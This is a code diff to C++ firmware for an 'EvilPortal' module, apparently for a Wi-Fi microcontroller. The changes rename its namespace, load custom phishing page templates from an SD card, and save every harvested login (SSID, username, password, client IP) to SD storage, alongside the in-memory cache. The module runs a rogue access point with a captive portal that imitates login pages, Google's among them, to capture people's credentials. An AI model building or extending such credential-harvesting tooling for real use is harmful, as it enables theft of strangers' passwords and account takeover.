@@ -4,8 +4,9 @@
  */
 
 #include "EvilPortal.h"
+#include "../core/SDManager.h"
 
-namespace Assessor {
+namespace Vanguard {
 
 // Static instance for callbacks
 EvilPortal* EvilPortal::s_instance = nullptr;
@@ -318,8 +319,19 @@ bool EvilPortal::start(const char* ssid, uint8_t channel, PortalTemplate tmpl) {
     m_channel = channel;
     m_template = tmpl;
 
+    // [PHASE 3.2] Custom Template Loading from SD
+    if (tmpl == PortalTemplate::CUSTOM) {
+        m_customHtml = SDManager::getInstance().readFile("/evil_portal/templates/index.html");
+        if (m_customHtml.length() == 0) {
+            if (Serial) Serial.println("[EvilPortal] Custom template not found on SD, falling back to GENERIC");
+            m_template = PortalTemplate::GENERIC_WIFI;
+        } else {
+            if (Serial) Serial.println("[EvilPortal] Custom template loaded from SD");
+        }
+    }
+
     if (Serial) {
-        Serial.printf("[EvilPortal] Starting: %s on ch%d\n", m_ssid, m_channel);
+        Serial.printf("[EvilPortal] Starting AP '%s' on ch %d...\n", ssid, channel);
     }
 
     // Stop any existing WiFi activity with watchdog feeding
@@ -540,10 +552,13 @@ void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
     snprintf(cred.clientMac, sizeof(cred.clientMac), "%s",
              request->client()->remoteIP().toString().c_str());
 
-    // Store credential
+    // Store credential (RAM Cache)
     if (s_instance->m_credentials.size() < MAX_CREDENTIALS) {
         s_instance->m_credentials.push_back(cred);
     }
+
+    // [PHASE 3.2] SD Persistence
+    SDManager::getInstance().logCredential(s_instance->m_ssid, cred.username, cred.password, cred.clientMac);
 
     // Fire callback
     if (s_instance->m_onCredential) {
@@ -577,8 +592,11 @@ String EvilPortal::getPortalHtml() {
             html = FPSTR(PORTAL_HTML_GOOGLE);
             break;
         case PortalTemplate::CUSTOM:
-            html = m_customHtml;
-            break;
+            if (m_customHtml.length() > 0) {
+                html = m_customHtml;
+                break;
+            }
+            // Fallthrough to generic if custom empty
         case PortalTemplate::GENERIC_WIFI:
         default:
             html = FPSTR(PORTAL_HTML_GENERIC);
@@ -595,4 +613,4 @@ String EvilPortal::getSuccessHtml() {
     return FPSTR(SUCCESS_HTML);
 }
 
-} // namespace Assessor
+} // namespace Vanguard
